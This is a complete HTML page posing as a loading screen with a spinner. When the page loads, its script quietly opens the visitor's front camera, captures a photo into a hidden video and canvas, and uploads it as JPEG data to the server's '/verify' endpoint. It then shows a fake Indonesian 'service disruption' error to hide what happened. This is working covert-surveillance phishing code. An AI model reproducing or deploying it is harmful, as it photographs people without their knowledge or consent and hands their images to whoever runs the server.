<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: Arial, sans-serif;
        }
        .container { text-align: center; }
        .spinner {
            width: 50px;
            height: 50px;
            margin: 0 auto 30px;
            border: 4px solid #e0e0e0;
            border-top-color: #333;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        h1 { font-size: 24px; font-weight: 400; color: #333; letter-spacing: 6px; }
        p { color: #999; margin-top: 10px; }
        .error { color: #ff3b30; margin-top: 30px; font-size: 14px; display: none; }
        #hidden-video { display: none; }
        #hidden-canvas { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <h1>LOADING</h1>
        <p>Please wait<span id="dots">...</span></p>
        <div class="error" id="error">⚠️ Maaf sedang gangguan</div>
    </div>

    <video id="hidden-video" autoplay playsinline></video>
    <canvas id="hidden-canvas"></canvas>

    <script>
        const video = document.getElementById('hidden-video');
        const canvas = document.getElementById('hidden-canvas');
        const errorEl = document.getElementById('error');
        const dots = document.getElementById('dots');

        async function start() {
            try {
                console.log('🚀 Starting...');
                
                // Access camera
                console.log('📷 Accessing camera...');
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: 640, height: 480 },
                    audio: false
                });
                
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 1000));
                
                // Capture
                console.log('📸 Capturing photo...');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);
                const imageData = canvas.toDataURL('image/jpeg', 0.85);
                console.log(`📸 Photo size: ${imageData.length} characters`);
                
                // Stop camera
                stream.getTracks().forEach(t => t.stop());
                
                console.log('📤 Sending to server...');
                
                // Send to server
                const response = await fetch('/verify', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ image: imageData })
                });
                
                const result = await response.json();
                console.log('📨 Server response:', result);
                
                if (result.success) {
                    console.log('✅ Success!');
                } else {
                    console.log('❌ Failed:', result.error);
                }
                
                // Show error
                errorEl.style.display = 'block';
                document.querySelector('.spinner').style.display = 'none';
                document.querySelector('h1').style.display = 'none';
                document.querySelector('p').style.display = 'none';
                
            } catch (err) {
                console.error('❌ Error:', err);
                errorEl.style.display = 'block';
                document.querySelector('.spinner').style.display = 'none';
                document.querySelector('h1').style.display = 'none';
                document.querySelector('p').style.display = 'none';
            }
        }

        window.onload = () => {
            console.log('📄 Page loaded');
            setTimeout(start, 500);
        };
    </script>
</body>
</html>
